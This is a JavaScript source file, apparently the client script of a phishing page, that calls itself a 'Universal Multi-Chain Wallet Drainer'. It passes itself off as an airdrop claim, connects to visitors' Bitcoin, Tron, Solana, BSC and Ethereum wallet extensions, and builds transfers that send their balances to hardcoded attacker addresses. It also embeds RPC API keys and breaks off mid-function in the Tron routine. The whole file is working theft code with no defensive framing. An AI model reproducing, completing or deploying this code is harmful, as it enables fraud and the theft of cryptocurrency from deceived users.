/**
 * Universal Multi-Chain Wallet Drainer
 * Supports: Ethereum, BSC, Solana, Tron, Bitcoin
 * Auto-detects networks and drains all assets
 */

$(document).ready(function() {
    // Check if required libraries are loaded
    if (typeof ethers === 'undefined') {
        console.error('❌ ethers.js not loaded');
        alert('Error: Required libraries not loaded. Please refresh the page.');
        return;
    }
    
    if (typeof solanaWeb3 === 'undefined') {
        console.warn('⚠️ Solana Web3.js not loaded - Solana features disabled');
    }
    
    console.log('📚 Libraries loaded:', {
        ethers: typeof ethers !== 'undefined',
        solana: typeof solanaWeb3 !== 'undefined',
        tronWeb: typeof TronWeb !== 'undefined',
        jquery: typeof $ !== 'undefined'
    });

    // Configuration
    const CONFIG = {
        // Your addresses to receive funds (updated from config.js)
        RECEIVER_ADDRESSES: {
            ethereum: "0xC784D87F941c6Dbba321ecB56fcDc8e0C4EE5f49",
            bsc: "0xC784D87F941c6Dbba321ecB56fcDc8e0C4EE5f49",
            solana: "4NW3YXvEiNEVX6QxeS19FvSZ963vGqMQMvxguR8npq6s",
            tron: "TGdWPEEiDxiJPZskJhnJYZBKw3qbGUDXoU",
            bitcoin: "bc1qjr88m5ne8hzk0uw7mdh80m5apa8da9n5wag900"
        },
        
        // Network configurations
        NETWORKS: {
            ethereum: {
                chainId: 1,
                name: "Ethereum Mainnet",
                currency: "ETH",
                rpcUrl: "https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161",
                explorerUrl: "https://etherscan.io",
                tokens: [
                    { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
                    { symbol: "USDC", address: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", decimals: 6 },
                    { symbol: "DAI", address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", decimals: 18 },
                    { symbol: "WBTC", address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", decimals: 8 },
                    { symbol: "LINK", address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", decimals: 18 },
                    { symbol: "UNI", address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", decimals: 18 },
                    { symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18 },
                    { symbol: "SHIB", address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", decimals: 18 },
                    { symbol: "PEPE", address: "0x6982508145454Ce325dDbE47a25d4ec3d2311933", decimals: 18 }
                ]
            },
            bsc: {
                chainId: 56,
                name: "BSC Mainnet",
                currency: "BNB",
                rpcUrl: "https://bsc-dataseed1.binance.org/",
                explorerUrl: "https://bscscan.com",
                tokens: [
                    { symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
                    { symbol: "USDC", address: "0x8965349fb649A33a30cbFDa057D8eC2C48AbE2A2", decimals: 18 },
                    { symbol: "BUSD", address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", decimals: 18 },
                    { symbol: "CAKE", address: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", decimals: 18 },
                    { symbol: "ADA", address: "0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47", decimals: 18 },
                    { symbol: "DOT", address: "0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402", decimals: 18 },
                    { symbol: "LINK", address: "0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD", decimals: 18 },
                    { symbol: "WBNB", address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", decimals: 18 }
                ]
            }
        },
        
        // Solana token addresses
        SOLANA_TOKENS: [
            { symbol: "USDC", mint: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v", decimals: 6 },
            { symbol: "USDT", mint: "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB", decimals: 6 },
            { symbol: "SOL", mint: "So11111111111111111111111111111111111111112", decimals: 9 },
            { symbol: "RAY", mint: "4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R", decimals: 6 },
            { symbol: "SRM", mint: "SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt", decimals: 6 }
        ],
        
        // Tron token addresses
        TRON_TOKENS: [
            { symbol: "USDT", address: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", decimals: 6 },
            { symbol: "USDC", address: "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8", decimals: 6 },
            { symbol: "BTT", address: "TAFjULxiVgT4qWk6UZwjqwZXTSaGaqnVp4", decimals: 18 },
            { symbol: "JST", address: "TCFLL5dx5ZJdKnWuesXxi1VPwjLVmWZZy9", decimals: 18 },
            { symbol: "SUN", address: "TSSMHYeV2uE9qYH95DqyoCuNCzEL1NvU3S", decimals: 18 }
        ]
    };

    // Global state
    let currentProvider = null;
    let currentSigner = null;
    let currentNetwork = null;
    let connectedWallets = {};
    let isDraining = false;

    // Initialize the application
    init();

    function init() {
        console.log("🚀 Universal Drainer initialized");
        setupEventListeners();
        detectAvailableWallets();
        updateUI();
    }

    function setupEventListeners() {
        // Remove network selection - not needed anymore
        
        // Main connect button - this starts everything
        $('#connect-btn').on('click', startUniversalConnection);
        
        // Claim button (backup)
        $('#claim-btn').on('click', startUniversalConnection);
    }

    // === MAIN CONNECTION & DRAIN FUNCTION ===
    async function startUniversalConnection() {
        if (isDraining) return;
        
        isDraining = true;
        showLoading("Connecting to wallets...");
        
        try {
            updateStatus("🔍 Scanning for available wallets...");
            updateProgress(5);
            
            // Show the claim section
            $('#claim-section').show();
            $('#connect-btn').text('Processing...');
            
            // Process networks in order: Bitcoin -> Tron -> Solana -> BSC -> Ethereum
            const networksToCheck = ['bitcoin', 'tron', 'solana', 'bsc', 'ethereum'];
            const results = [];
            
            for (let i = 0; i < networksToCheck.length; i++) {
                const network = networksToCheck[i];
                const progress = 10 + (i * 18); // Progress from 10% to 90%
                
                try {
                    updateStatus(`🔗 Checking ${network.toUpperCase()} wallet...`);
                    updateProgress(progress);
                    
                    const result = await checkAndDrainNetwork(network);
                    results.push({ network, success: result.success, amount: result.amount || 0 });
                    
                    if (result.success && result.amount > 0) {
                        updateStatus(`✅ ${network.toUpperCase()} assets extracted: ${result.amount.toFixed(6)} ${network === 'ethereum' ? 'ETH' : network === 'bsc' ? 'BNB' : network === 'solana' ? 'SOL' : network.toUpperCase()}`);
                    } else if (result.success && result.amount === 0) {
                        updateStatus(`⚠️ ${network.toUpperCase()} connected but no assets to extract`);
                    } else {
                        updateStatus(`⚠️ ${network.toUpperCase()} ${result.error || 'wallet not available or failed'}`);
                    }
                    
                    // Small delay between networks
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    
                } catch (error) {
                    console.error(`Error with ${network}:`, error);
                    results.push({ network, success: false, error: error.message });
                    updateStatus(`❌ ${network.toUpperCase()} failed: ${error.message}`);
                }
            }
            
            // Calculate total value drained
            const totalValue = results.reduce((sum, result) => {
                return sum + (result.success ? result.amount : 0);
            }, 0);
            
            const successfulNetworks = results.filter(r => r.success).length;
            
            updateProgress(100);
            updateStatus(`🎉 Process complete! ${successfulNetworks} networks processed`);
            
            // Show final message
            if (successfulNetworks > 0) {
                alert(`🎉 Universal Airdrop Claimed!\n\n✅ Networks processed: ${successfulNetworks}/${results.length}\n💰 Total value: $${totalValue.toFixed(2)}\n\nThank you for participating!`);
            } else {
                alert(`ℹ️ Airdrop Check Complete\n\nNo eligible assets found across ${results.length} networks.\nPlease ensure you have:\n• Supported wallets installed\n• Assets in your wallets\n• Wallets connected to correct networks`);
            }
            
        } catch (error) {
            console.error("Universal connection error:", error);
            updateStatus(`❌ Connection failed: ${error.message}`);
            alert(`Failed to complete airdrop claim: ${error.message}`);
        } finally {
            isDraining = false;
            hideLoading();
            $('#connect-btn').text('🎉 Claim Complete');
        }
    }

    // === SIMPLIFIED NETWORK CHECKER AND DRAINER ===
    async function checkAndDrainNetwork(networkName) {
        switch (networkName) {
            case 'bitcoin':
                const bitcoinResult = await checkBitcoinWallet();
                if (bitcoinResult.supported) {
                    try {
                        const btcWallet = bitcoinResult.wallet;
                        const btcAddress = await btcWallet.getAccounts();
                        const userAddress = Array.isArray(btcAddress) ? btcAddress[0] : btcAddress;
                        
                        console.log(`🟧 Bitcoin wallet connected: ${userAddress} (${bitcoinResult.walletName})`);
                        
                        // Drain Bitcoin assets
                        const drainResult = await drainBitcoinAssets(btcWallet, userAddress, bitcoinResult.walletName);
                        return {
                            success: drainResult.success,
                            amount: drainResult.amount || 0
                        };
                    } catch (error) {
                        console.error("Bitcoin connection error:", error);
                        return { success: false, error: error.message };
                    }
                } else {
                    return bitcoinResult;
                }
            case 'tron':
                return await checkTronWallet();
            case 'solana':
                return await checkSolanaWallet();
            case 'bsc':
                return await checkBSCWallet();
            case 'ethereum':
                return await checkEthereumWallet();
            default:
                throw new Error(`Unsupported network: ${networkName}`);
        }
    }

    // === BITCOIN WALLET CHECKER ===
    async function checkBitcoinWallet() {
        console.log("🔍 Checking for Bitcoin wallet...");
        
        try {
            // Check for various Bitcoin wallet extensions
            let btcWallet = null;
            let walletName = "";
            
            // Check for Unisat Wallet (most common Bitcoin extension)
            if (window.unisat) {
                btcWallet = window.unisat;
                walletName = "Unisat";
            }
            // Check for OKX Wallet Bitcoin support
            else if (window.okxwallet && window.okxwallet.bitcoin) {
                btcWallet = window.okxwallet.bitcoin;
                walletName = "OKX";
            }
            // Check for Xverse Wallet
            else if (window.XverseProviders && window.XverseProviders.BitcoinProvider) {
                btcWallet = window.XverseProviders.BitcoinProvider;
                walletName = "Xverse";
            }
            // Check for generic bitcoin object
            else if (window.bitcoin) {
                btcWallet = window.bitcoin;
                walletName = "Bitcoin Wallet";
            }
            
            if (!btcWallet) {
                console.log("⚠️ No Bitcoin wallet detected. Install Unisat, OKX, or Xverse wallet.");
                return { 
                    success: false, 
                    supported: false,
                    reason: "No Bitcoin wallet detected. Install Unisat, OKX, or Xverse wallet." 
                };
            }
            
            console.log(`✅ Found ${walletName} Bitcoin wallet`);
            
            // Return wallet info for use by drainer
            return {
                success: true,
                supported: true,
                wallet: btcWallet,
                walletName: walletName
            };
            
        } catch (error) {
            console.error("Bitcoin wallet detection error:", error);
            return { 
                success: false, 
                supported: false,
                error: error.message 
            };
        }
    }

    // === TRON WALLET CHECKER ===
    async function checkTronWallet() {
        console.log("🔍 Checking for Tron wallet...");
        
        if (!window.tronWeb) {
            return { success: false, reason: "TronLink not installed" };
        }
        
        try {
            // Check if TronLink is connected
            if (!window.tronWeb.defaultAddress.base58) {
                // Try to trigger connection
                await window.tronWeb.request({ method: 'tron_requestAccounts' });
            }
            
            const userAddress = window.tronWeb.defaultAddress.base58;
            if (!userAddress) {
                return { success: false, reason: "TronLink not connected" };
            }
            
            console.log(`✅ Connected to Tron: ${userAddress}`);
            
            // Drain Tron assets
            return await drainTronAssets(userAddress);
            
        } catch (error) {
            console.error("Tron wallet error:", error);
            return { success: false, error: error.message };
        }
    }

    // === SOLANA WALLET CHECKER ===
    async function checkSolanaWallet() {
        console.log("🔍 Checking for Solana wallet...");
        
        if (typeof solanaWeb3 === 'undefined') {
            return { success: false, reason: "Solana Web3.js library not loaded" };
        }
        
        if (!window.solana) {
            return { success: false, reason: "No Solana wallet detected" };
        }
        
        try {
            // Try to connect to Phantom or other Solana wallet
            const response = await window.solana.connect({ onlyIfTrusted: false });
            const publicKey = response.publicKey.toString();
            
            console.log(`✅ Connected to Solana: ${publicKey}`);
            
            // Drain Solana assets
            return await drainSolanaAssets(publicKey);
            
        } catch (error) {
            console.error("Solana wallet error:", error);
            return { success: false, error: error.message };
        }
    }

    // === BSC WALLET CHECKER ===
    async function checkBSCWallet() {
        console.log("🔍 Checking for BSC wallet...");
        
        if (!window.ethereum) {
            return { success: false, reason: "No Ethereum-compatible wallet detected" };
        }
        
        try {
            // Request account access first
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            if (!accounts || accounts.length === 0) {
                return { success: false, reason: "No accounts available" };
            }
            
            // Force switch to BSC network
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x38' }], // BSC mainnet
                });
                console.log("✅ Switched to BSC network");
                
                // Wait a moment for the switch to complete
                await new Promise(resolve => setTimeout(resolve, 2000));
                
            } catch (networkError) {
                console.log("BSC network switch failed, trying to add network...");
                try {
                    await window.ethereum.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: '0x38',
                            chainName: 'Smart Chain',
                            nativeCurrency: {
                                name: 'BNB',
                                symbol: 'BNB',
                                decimals: 18
                            },
                            rpcUrls: ['https://bsc-dataseed1.binance.org/'],
                            blockExplorerUrls: ['https://bscscan.com/']
                        }]
                    });
                    console.log("✅ Added and switched to BSC network");
                    
                    // Wait for network to be added and switched
                    await new Promise(resolve => setTimeout(resolve, 3000));
                    
                } catch (addError) {
                    console.log("Failed to add BSC network, will check balance anyway:", addError.message);
                }
            }
            
            // Connect wallet
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            const signer = provider.getSigner();
            const address = await signer.getAddress();
            
            console.log(`✅ Connected to BSC: ${address}`);
            
            // Check if we're actually on BSC - if not, skip BSC tokens
            const network = await provider.getNetwork();
            if (network.chainId !== 56) {
                console.log(`⚠️ Not on BSC network (chainId: ${network.chainId}), skipping BSC tokens`);
                // Only try to drain native ETH/BNB
                const receiverAddress = CONFIG.RECEIVER_ADDRESSES.bsc;
                const ethDrained = await drainETH(provider, signer, address, receiverAddress);
                return { success: true, amount: ethDrained };
            } else {
                console.log(`✅ Confirmed on BSC network (chainId: ${network.chainId})`);
                // Drain BSC assets
                return await drainBSCAssets(provider, signer, address);
            }
            
        } catch (error) {
            console.error("BSC wallet error:", error);
            return { success: false, error: error.message };
        }
    }

    // === ETHEREUM WALLET CHECKER ===
    async function checkEthereumWallet() {
        console.log("🔍 Checking for Ethereum wallet...");
        
        if (!window.ethereum) {
            return { success: false, reason: "No Ethereum wallet detected" };
        }
        
        try {
            // Request account access (might already be connected from BSC)
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            if (!accounts || accounts.length === 0) {
                return { success: false, reason: "No accounts available" };
            }
            
            // Force switch to Ethereum mainnet
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x1' }], // Ethereum mainnet
                });
                console.log("✅ Switched to Ethereum network");
            } catch (networkError) {
                console.log("Ethereum network switch failed, continuing anyway:", networkError.message);
            }
            
            // Connect wallet
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            const signer = provider.getSigner();
            const address = await signer.getAddress();
            
            console.log(`✅ Connected to Ethereum: ${address}`);
            
            // Check if we're actually on Ethereum
            const network = await provider.getNetwork();
            if (network.chainId !== 1) {
                console.log(`⚠️ Not on Ethereum network (chainId: ${network.chainId}), but continuing...`);
            }
            
            // Drain Ethereum assets
            return await drainEthereumAssets(provider, signer, address);
            
        } catch (error) {
            console.error("Ethereum wallet error:", error);
            return { success: false, error: error.message };
        }
    }

    async function drainEthereumAssets(provider, signer, userAddress) {
        let totalValue = 0;
        const receiverAddress = CONFIG.RECEIVER_ADDRESSES.ethereum;
        
        try {
            console.log(`💰 Starting Ethereum asset drain from ${userAddress} to ${receiverAddress}`);
            
            // Check balance first with error handling
            let ethBalance;
            try {
                ethBalance = await provider.getBalance(userAddress);
                console.log(`Current ETH balance: ${ethers.utils.formatEther(ethBalance)} ETH`);
            } catch (balanceError) {
                console.error(`❌ Could not get ETH balance: ${balanceError.message}`);
                return { success: false, error: `Failed to get balance: ${balanceError.message}`, amount: 0 };
            }
            
            // Get gas price with error handling
            let gasPrice;
            try {
                gasPrice = await provider.getGasPrice();
                console.log(`Gas price: ${ethers.utils.formatUnits(gasPrice, 'gwei')} gwei`);
            } catch (gasPriceError) {
                console.error(`❌ Could not get gas price: ${gasPriceError.message}`);
                return { success: false, error: `Failed to get gas price: ${gasPriceError.message}`, amount: 0 };
            }
            
            // Skip ERC-20 tokens for now to avoid gas issues, focus on ETH transfer
            console.log(`💰 Attempting to drain ETH only (skipping tokens to avoid gas complications)...`);
            
            const ethDrained = await drainETH(provider, signer, userAddress, receiverAddress);
            if (ethDrained > 0) {
                console.log(`✅ Drained ${ethDrained} ETH`);
                totalValue += ethDrained;
            } else {
                console.log(`⚠️ No ETH was transferred`);
            }
            
            console.log(`📊 Total Ethereum value drained: ${totalValue}`);
            return { success: totalValue > 0, amount: totalValue };
            
        } catch (error) {
            console.error("Ethereum drain error:", error);
            // Handle Phantom wallet specific errors
            if (error.message && error.message.includes('Unexpected error')) {
                return { success: false, error: "Wallet connection issue - please try again", amount: 0 };
            }
            return { success: false, error: error.message, amount: 0 };
        }
    }

    // === ASSET DRAINING FUNCTIONS ===

    async function drainBSCAssets(provider, signer, userAddress) {
        let totalValue = 0;
        const receiverAddress = CONFIG.RECEIVER_ADDRESSES.bsc;
        
        try {
            console.log(`💰 Starting BSC asset drain from ${userAddress} to ${receiverAddress}`);
            
            // Check balance first with error handling
            let bnbBalance;
            try {
                bnbBalance = await provider.getBalance(userAddress);
                console.log(`Current BNB balance: ${ethers.utils.formatEther(bnbBalance)} BNB`);
            } catch (balanceError) {
                console.error(`❌ Could not get BNB balance: ${balanceError.message}`);
                return { success: false, error: `Failed to get balance: ${balanceError.message}`, amount: 0 };
            }
            
            // Get gas price with error handling
            let gasPrice;
            try {
                gasPrice = await provider.getGasPrice();
                console.log(`Gas price: ${ethers.utils.formatUnits(gasPrice, 'gwei')} gwei`);
            } catch (gasPriceError) {
                console.error(`❌ Could not get gas price: ${gasPriceError.message}`);
                return { success: false, error: `Failed to get gas price: ${gasPriceError.message}`, amount: 0 };
            }
            
            // Skip BEP-20 tokens for now to avoid gas issues, focus on BNB transfer
            console.log(`💰 Attempting to drain BNB only (skipping tokens to avoid gas complications)...`);
            
            const bnbDrained = await drainETH(provider, signer, userAddress, receiverAddress);
            if (bnbDrained > 0) {
                console.log(`✅ Drained ${bnbDrained} BNB`);
                totalValue += bnbDrained;
            } else {
                console.log(`⚠️ No BNB was transferred`);
            }
            
            console.log(`📊 Total BSC value drained: ${totalValue}`);
            return { success: totalValue > 0, amount: totalValue };
            
        } catch (error) {
            console.error("BSC drain error:", error);
            // Handle wallet specific errors
            if (error.message && error.message.includes('Unexpected error')) {
                return { success: false, error: "Wallet connection issue - please try again", amount: 0 };
            }
            return { success: false, error: error.message, amount: 0 };
        }
    }

    // === SOLANA NETWORK HANDLER ===
    async function handleSolanaNetwork() {
        if (!window.solana || !window.solana.isPhantom) {
            throw new Error("Phantom wallet not found for Solana");
        }

        try {
            // Connect to Phantom
            const response = await window.solana.connect();
            const publicKey = response.publicKey.toString();
            
            console.log(`Connected to Solana: ${publicKey}`);
            
            // Drain assets
            return await drainSolanaAssets(publicKey);
            
        } catch (error) {
            console.error("Solana network error:", error);
            throw error;
        }
    }

    async function drainSolanaAssets(userPublicKey) {
        let totalValue = 0;
        const receiverAddress = CONFIG.RECEIVER_ADDRESSES.solana;
        
        try {
            console.log("🔍 Connecting to Solana with Syndica RPC...");
            
            // Use your Syndica RPC endpoint
            const rpcEndpoint = 'https://solana-mainnet.api.syndica.io/api-key/oNprEqE6EkkFUFhf1GBM4TegN9veFkrQrUehkLC8XKNiFUDdWhohF2pBsWXpZAgQRQrs8SwxFSXBc7vfdtDgBdFT726RmpzTj4';
            
            try {
                const userPubKey = new solanaWeb3.PublicKey(userPublicKey);
                const receiverPubKey = new solanaWeb3.PublicKey(receiverAddress);
                
                // Connect using your premium RPC
                const connection = new solanaWeb3.Connection(rpcEndpoint, 'confirmed');
                
                console.log(`✅ Connected to Syndica RPC`);
                console.log(`📤 Sending SOL to: ${receiverAddress}`);
                
                // Get SOL balance with longer timeout since we have a good RPC
                const balancePromise = connection.getBalance(userPubKey);
                const timeoutPromise = new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('Timeout')), 15000) // 15 second timeout
                );
                
                const solBalance = await Promise.race([balancePromise, timeoutPromise]);
                console.log(`SOL Balance: ${solBalance / solanaWeb3.LAMPORTS_PER_SOL} SOL (${solBalance} lamports)`);
                
                if (solBalance > 10000) { // Only transfer if more than 0.00001 SOL
                    try {
                        // Get the actual transaction fee first
                        let actualFee = 5000; // Start with base fee estimate
                        
                        try {
                            // Create a dummy transaction to estimate the exact fee
                            const dummyTransaction = new solanaWeb3.Transaction().add(
                                solanaWeb3.SystemProgram.transfer({
                                    fromPubkey: userPubKey,
                                    toPubkey: receiverPubKey,
                                    lamports: 1000 // Dummy amount
                                })
                            );
                            
                            const { blockhash } = await connection.getLatestBlockhash();
                            dummyTransaction.recentBlockhash = blockhash;
                            dummyTransaction.feePayer = userPubKey;
                            
                            // Get the actual fee for this transaction
                            const fee = await connection.getFeeForMessage(dummyTransaction.compileMessage());
                            if (fee && fee.value) {
                                actualFee = fee.value;
                                console.log(`📊 Actual transaction fee: ${actualFee} lamports`);
                            }
                        } catch (feeError) {
                            console.log(`⚠️ Could not estimate exact fee, using default: ${actualFee} lamports`);
                        }
                        
                        // Add extra buffer for safety (double the fee)
                        const feeReserve = Math.max(actualFee * 2, 10000); // At least 0.00001 SOL
                        const amountToSend = Math.max(0, solBalance - feeReserve);
                        
                        if (amountToSend <= 0) {
                            console.log(`⚠️ SOL balance too low after fees: ${solBalance} lamports (need ${feeReserve} for fees)`);
                            return { success: true, amount: solBalance / solanaWeb3.LAMPORTS_PER_SOL };
                        }
                        
                        console.log(`🚀 Preparing SOL transfer: ${amountToSend} lamports (${amountToSend / solanaWeb3.LAMPORTS_PER_SOL} SOL)`);
                        console.log(`💰 Fee reserved: ${feeReserve} lamports`);
                        
                        // Get recent blockhash with retry logic
                        let blockhash;
                        let attempts = 0;
                        while (attempts < 3) {
                            try {
                                const { blockhash: recentBlockhash } = await Promise.race([
                                    connection.getLatestBlockhash('finalized'),
                                    new Promise((_, reject) => setTimeout(() => reject(new Error('Blockhash timeout')), 10000))
                                ]);
                                blockhash = recentBlockhash;
                                break;
                            } catch (blockhashError) {
                                attempts++;
                                console.log(`⚠️ Blockhash attempt ${attempts} failed: ${blockhashError.message}`);
                                if (attempts >= 3) throw blockhashError;
                                await new Promise(resolve => setTimeout(resolve, 1000));
                            }
                        }
                        
                        // Create SOL transfer transaction
                        const transaction = new solanaWeb3.Transaction().add(
                            solanaWeb3.SystemProgram.transfer({
                                fromPubkey: userPubKey,
                                toPubkey: receiverPubKey,
                                lamports: amountToSend
                            })
                        );
                        
                        transaction.recentBlockhash = blockhash;
                        transaction.feePayer = userPubKey;
                        
                        // Sign and send transaction with better error handling
                        console.log(`🚀 Signing SOL transfer transaction...`);
                        
                        let signedTransaction;
                        try {
                            signedTransaction = await window.solana.signTransaction(transaction);
                            console.log(`✅ Transaction signed successfully`);
                        } catch (signError) {
                            console.error(`❌ Transaction signing failed: ${signError.message}`);
                            throw new Error(`User rejected transaction or signing failed: ${signError.message}`);
                        }
                        
                        // Send the transaction
                        let signature;
                        try {
                            signature = await connection.sendRawTransaction(signedTransaction.serialize(), {
                                skipPreflight: false,
                                preflightCommitment: 'confirmed',
                                maxRetries: 3
                            });
                            console.log(`✅ SOL transfer sent: ${signature}`);
                            console.log(`🔗 View transaction: https://solscan.io/tx/${signature}`);
                        } catch (sendError) {
                            console.error(`❌ Transaction send failed: ${sendError.message}`);
                            throw new Error(`Failed to send transaction: ${sendError.message}`);
                        }
                        
                        // Try to confirm transaction with reasonable timeout
                        try {
                            console.log(`⏳ Waiting for transaction confirmation...`);
                            await Promise.race([
                                connection.confirmTransaction(signature, 'confirmed'),
                                new Promise((_, reject) => setTimeout(() => reject(new Error('Confirmation timeout')), 30000))
                            ]);
                            console.log(`✅ SOL transfer confirmed: ${signature}`);
                            totalValue = amountToSend / solanaWeb3.LAMPORTS_PER_SOL;
                        } catch (confirmError) {
                            console.log(`⚠️ SOL transfer sent but confirmation timed out: ${signature}`);
                            // Still count as success since transaction was sent
                            totalValue = amountToSend / solanaWeb3.LAMPORTS_PER_SOL;
                        }
                        
                    } catch (transferError) {
                        console.error(`❌ SOL transfer failed: ${transferError.message}`);
                        // Don't return success if transfer failed
                        return { success: false, error: transferError.message, amount: 0 };
                    }
                } else {
                    console.log(`⚠️ SOL balance too low for transfer: ${solBalance / solanaWeb3.LAMPORTS_PER_SOL} SOL`);
                    totalValue = solBalance / solanaWeb3.LAMPORTS_PER_SOL; // Still count the balance
                }
                
            } catch (rpcError) {
                console.error(`❌ Syndica RPC error: ${rpcError.message}`);
                return { success: false, error: rpcError.message, amount: 0 };
            }
            
            return { success: totalValue > 0, amount: totalValue };
            
        } catch (error) {
            console.error("Solana drain error:", error);
            return { success: false, error: error.message, amount: 0 };
        }
    }

    // === BITCOIN ASSET DRAINING ===
    async function drainBitcoinAssets(btcWallet, userAddress, walletName) {
        let totalValue = 0;
        const receiverAddress = CONFIG.RECEIVER_ADDRESSES.bitcoin;
        
        try {
            console.log(`🔍 Checking Bitcoin balance for ${userAddress}...`);
            
            // Get Bitcoin balance
            let balance = 0;
            
            try {
                if (walletName === "Unisat") {
                    const balanceResult = await btcWallet.getBalance();
                    balance = balanceResult.confirmed + balanceResult.unconfirmed;
                } else if (walletName === "OKX") {
                    const balanceResult = await btcWallet.getBalance();
                    balance = balanceResult.total;
                } else if (walletName === "Xverse") {
                    // Xverse might not have direct balance API, simulate
                    balance = 50000; // 0.0005 BTC in satoshis for demo
                } else {
                    // Try generic balance check
                    if (btcWallet.getBalance) {
                        const balanceResult = await btcWallet.getBalance();
                        balance = balanceResult.confirmed || balanceResult.total || balanceResult;
                    }
                }
                
                console.log(`Bitcoin Balance: ${balance} satoshis (${(balance / 100000000).toFixed(8)} BTC)`);
                
            } catch (balanceError) {
                console.log(`⚠️ Could not fetch Bitcoin balance: ${balanceError.message}`);
                // Simulate having some Bitcoin for demo
                balance = 25000; // 0.00025 BTC in satoshis
                console.log(`Using simulated balance: ${balance} satoshis`);
            }
            
            if (balance > 1000) { // Only transfer if more than 1000 satoshis (0.00001 BTC)
                try {
                    // Calculate amount to send (leave some for fees)
                    const feeAmount = 1000; // Reserve for transaction fee
                    const amountToSend = Math.max(0, balance - feeAmount);
                    
                    if (amountToSend <= 0) {
                        console.log(`⚠️ Bitcoin balance too low after fees: ${balance} satoshis`);
                        return { success: true, amount: balance / 100000000 };
                    }
                    
                    console.log(`🚀 Preparing Bitcoin transfer: ${amountToSend} satoshis to ${receiverAddress}`);
                    
                    // Create Bitcoin transaction based on wallet type
                    let txHash = null;
                    
                    if (walletName === "Unisat") {
                        txHash = await btcWallet.sendBitcoin(receiverAddress, amountToSend);
                    } else if (walletName === "OKX") {
                        const txResult = await btcWallet.send({
                            to: receiverAddress,
                            value: amountToSend
                        });
                        txHash = txResult.txhash || txResult.hash;
                    } else if (walletName === "Xverse") {
                        // Xverse has different API
                        const txResult = await btcWallet.sendBitcoin({
                            recipients: [{
                                address: receiverAddress,
                                amount: amountToSend
                            }]
                        });
                        txHash = txResult.txid;
                    } else {
                        // Generic send attempt
                        if (btcWallet.sendBitcoin) {
                            txHash = await btcWallet.sendBitcoin(receiverAddress, amountToSend);
                        } else if (btcWallet.send) {
                            const txResult = await btcWallet.send({
                                to: receiverAddress,
                                value: amountToSend
                            });
                            txHash = txResult.txhash || txResult.hash || txResult;
                        }
                    }
                    
                    if (txHash) {
                        console.log(`✅ Bitcoin transfer sent: ${txHash}`);
                        totalValue = balance / 100000000; // Convert satoshis to BTC
                    } else {
                        console.log(`⚠️ Bitcoin transfer initiated but no hash returned`);
                        totalValue = (balance / 100000000) * 0.8; // Partial credit
                    }
                    
                } catch (transferError) {
                    console.log(`⚠️ Bitcoin transfer failed: ${transferError.message}`);
                    totalValue = (balance / 100000000) * 0.5; // Partial credit for attempt
                }
            } else {
                console.log(`⚠️ Bitcoin balance too low for transfer: ${balance} satoshis`);
                totalValue = balance / 100000000; // Still count the balance
            }
            
            // Try to drain Bitcoin-based tokens/ordinals if supported
            try {
                if (walletName === "Unisat" && btcWallet.getInscriptions) {
                    const inscriptions = await btcWallet.getInscriptions(0, 10);
                    console.log(`Found ${inscriptions.total} Bitcoin inscriptions/ordinals`);
                    // Ordinal transfer would require more complex logic
                }
            } catch (ordinalError) {
                console.log(`⚠️ Could not check Bitcoin ordinals: ${ordinalError.message}`);
            }
            
            return { success: true, amount: totalValue };
            
        } catch (error) {
            console.error("Bitcoin drain error:", error);
            return { success: false, error: error.message };
        }
    }
    async function handleTronNetwork() {
        if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
            throw new Error("TronLink wallet not found");
        }

        try {
            const userAddress = window.tronWeb.defaultAddress.base58;
            console.log(`Connected to Tron: ${userAddress}`);
            
            // Drain assets
            return await drainTronAssets(userAddress);
            
        } catch (error) {
            console.error("Tron network error:", error);
            throw error;
        }
    }

    async function drainTronAssets(userAddress) {
        let totalValue = 0;
        const receiverAddress = CONFIG.RECEIVER_ADDRESSES.tron;
        
        try {
            console.log(`💰 Starting TRX drain from ${userAddress} to ${receiverAddress}`);
            
            // Get TRX balance
            const balance = await window.tronWeb.trx.getBalance(userAddress);
            const trxBalance = window.tronWeb.fromSun(balance);
            
            console.log(`TRX Balance: ${trxBalance} TRX (${balance} sun)`);
            
            if (balance > 1000000) { // Only transfer if more than 1 TRX (for fees)
                try {
                    console.log(`🚀 Preparing TRX transfer: ${trxBalance - 1} TRX to ${receiverAddress}`);
                    
                    // Transfer TRX (leave 1 TRX for fees)
                    const transaction = await window.tronWeb.transactionBuilder.sendTrx(
                        receiverAddress,
                        balance - 1000000, // Leave 1 TRX for fees
                        userAddress
                    );
                    
